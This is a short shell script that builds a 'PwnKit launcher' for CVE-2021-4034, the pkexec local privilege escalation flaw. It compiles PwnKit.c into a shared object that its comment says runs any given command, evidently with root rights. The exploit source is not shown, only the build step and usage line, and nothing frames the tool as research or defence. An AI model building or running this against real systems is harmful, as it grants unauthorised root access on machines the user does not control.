#!/bin/sh
# build PwnKit launcher (CVE-2021-4034): ./PwnKit '<command>'
set -e
cd "$(dirname "$0")"
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
echo "built: $(pwd)/PwnKit"
